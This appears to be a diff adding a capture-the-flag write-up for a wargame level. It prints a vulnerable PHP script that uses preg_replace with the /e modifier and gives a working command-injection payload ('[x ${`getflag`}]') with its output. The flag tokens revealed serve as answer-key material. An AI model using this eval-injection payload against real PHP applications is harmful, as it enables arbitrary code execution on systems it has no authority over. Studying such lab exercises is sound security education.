@@ -1,0 +1,33 @@
+viuaaale9huek52boumoomioc
+
+<- ls
+-> level06  level06.php
+
+<- cat level06.php
+-> #!/usr/bin/php
+-> <?php
+-> function y($m)
+-> {
+-> 	$m = preg_replace("/\./", " x ", $m);
+-> 	$m = preg_replace("/@/", " y", $m);
+-> 	return $m;
+-> }
+-> function x($y, $z)
+-> {
+-> 	$a = file_get_contents($y);
+-> 	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+-> 	$a = preg_replace("/\[/", "(", $a);
+-> 	$a = preg_replace("/\]/", ")", $a);
+-> 	return $a;
+-> }
+-> $r = x($argv[1], $argv[2]); print $r;
+-> ?>
+
+We have there an executable that read the first file in arguments, apply a regex that replece "([x (.*)]" by "y("\2")". Be aware of /e that replace '"' by '\"' .
+That means a string like "([x popipo]" will become y(popipo) and then later executing the function y.
+
+So we can explot it:
+
+<- echo '[x ${`getflag`}]' > /tmp/popipo
+<- ./level06 /tmp/popipo
+-> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
